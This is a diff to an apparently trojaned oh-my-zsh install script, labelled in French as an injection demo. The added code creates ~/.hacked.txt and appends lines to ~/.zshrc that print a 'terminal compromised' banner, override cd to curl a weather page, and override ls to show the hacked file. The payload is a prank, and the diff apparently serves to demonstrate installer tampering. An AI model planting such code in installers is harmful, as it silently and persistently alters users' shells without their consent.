@@ -550,16 +550,21 @@ EOF
     exit
   fi
 
-  # --- INJECTION DEMO ---
-  echo "[⚠️] Configuration additionnelle... 🤖"
+  # --- INJECTION POUR LA DEMO ---
+  echo "[⚠️] Configuration additionnelle..."
 
-  # Créer un fichier 'hacked.txt' pour montrer la prise de contrôle
+  # Création un fichier 'hacked.txt' 
   echo "Oopsy tu viens de te faire avoir par mon oh-my-zsh install personnalisé." > ~/.hacked.txt
 
-  # Ajouter un message dans le terminal à chaque lancement
+  # Afficher un message dans le terminal au lancement
   if [ -f ~/.zshrc ]; then
-    echo 'echo "💀 Aïe ton terminal est désormais compromis par un script modifié ! 💀"' >> ~/.zshrc
+    echo 'echo "💀 Aïe à partir de maintenant ton terminal est compromis par un script modifié ! 💀"' >> ~/.zshrc
+
+      # Modifier l'alias cd
       echo 'alias cd="echo \\"\\nTu es sûr que tu ne veux pas rester ici plutôt ? Regarde comme on est bien :\\"; echo \\"Météo à Grenoble :\\"; curl -s wttr.in/grenoble; echo \\"\\n\\"; command cd \"$@\""' >> ~/.zshrc
+
+      # Modifier l'alias ls
+      echo 'alias ls="cat ~/.hacked.txt"' >> ~/.zshrc
 
   fi
 
